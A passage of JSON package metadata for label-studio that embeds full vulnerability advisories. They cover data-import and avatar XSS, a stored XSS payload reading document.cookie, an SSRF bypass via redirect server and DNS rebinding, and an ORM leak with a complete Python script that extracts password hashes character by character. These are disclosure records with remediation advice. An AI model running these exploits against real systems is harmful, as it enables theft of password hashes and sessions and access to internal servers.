JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.9.1.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.9.1.post0/","requires_dist":["wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.20)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","humansignal-drf-yasg (>=1.21.9)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.24.3)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (<4.0.0,>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (>=2.8.1)","pytz (~=2022.1)","requests (==2.31.0)","urllib3 (==1.26.16)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.57)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.9.1.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"55abe8c40e9ce29c46cdd2e1e7b535264b9e3be1749c2b23c1111cc6354dba2c","md5":"9451a5b1673941d04a84cc22bdd11d57","sha256":"ab58aa12cd44fe800a68c58cde8be6f1a2f382140a6a64ee6fdfe9d00bd6bcb8"},"downloads":-1,"filename":"label_studio-1.9.1.post0-py3-none-any.whl","has_sig":false,"md5_digest":"9451a5b1673941d04a84cc22bdd11d57","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":57795484,"upload_time":"2023-10-13T19:00:23","upload_time_iso_8601":"2023-10-13T19:00:23.388520Z","url":"https://files.pythonhosted.org/packages/55/ab/e8c40e9ce29c46cdd2e1e7b535264b9e3be1749c2b23c1111cc6354dba2c/label_studio-1.9.1.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"93146dcce596dec77093897e767f83b36a10c17978fa4a4c43d7a6922a1d1cf7","md5":"3c30b990b818bd12f2a01fb0b80487e1","sha256":"632b7ca6f5d9a12c5820ff004f3ebd3daa2fd10e4e544249b0cb8b2c033bb783"},"downloads":-1,"filename":"label-studio-1.9.1.post0.tar.gz","has_sig":false,"md5_digest":"3c30b990b818bd12f2a01fb0b80487e1","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":56673585,"upload_time":"2023-10-13T19:00:30","upload_time_iso_8601":"2023-10-13T19:00:30.744796Z","url":"https://files.pythonhosted.org/packages/93/14/6dcce596dec77093897e767f83b36a10c17978fa4a4c43d7a6922a1d1cf7/label-studio-1.9.1.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability 